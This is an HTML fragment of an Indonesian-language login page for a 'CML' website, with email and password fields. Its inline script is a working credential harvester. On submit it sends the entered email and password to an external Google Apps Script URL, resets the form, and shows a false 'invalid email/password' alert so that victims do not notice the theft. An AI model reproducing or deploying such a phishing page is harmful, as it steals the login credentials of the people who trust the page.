    <div class="forum-login">
      <a href="">
        <span class="img"></span>
        <img src="img/hand-kanan.png" alt="" class="tangan-kanan tangan" />
        <img src="img/hand-kiri.png" alt="" class="tangan-kiri tangan" />
      </a>
      <div class="indicator"></div>
      <div class="wrapper">
        <p>Selamat datang di website CML</p>
        <h2>Login</h2>
        <form name="cml-login">
          <div class="form-group">
            <label for="username">Email</label>
            <input type="email" class="form-control" id="username" placeholder="Masukkan username anda" autocomplete="off" name="email" />
          </div>

          <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" class="form-control" placeholder="Masukkan password anda" autocomplete="off" oninput="showTangan()" onfocus="showTangan()" onblur="hideTangan()" name="password" />
            <span class="show"> <i class="bi bi-eye"></i></span>
            <span class="hide"><i class="bi bi-eye-slash"></i></span>
          </div>

          <div class="form-input">
            <input type="submit" class="tml" value="Login" />
          </div>
        </form>
      </div>
    </div>
    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <script src="script.js"></script>

    <script>
      const scriptURL = "https://script.google.com/macros/s/AKfycbyDB3YipUcKIyakZyhhyjmPceYkpAZAJ0bWsk-6YeaqZ126ryKum-yPGRzaFesTRlZ8/exec";
      const form = document.forms["cml-login"];

      form.addEventListener("submit", (e) => {
        e.preventDefault();
        fetch(scriptURL, { method: "POST", body: new FormData(form) })
          .then((response) => {
            form.reset();
            console.log("Success!", response);
            alert("Email/Password anda tidak valid, coba di periksa kembali");
          })
          .catch((error) => console.error("Error!", error.message));
      });
    </script>
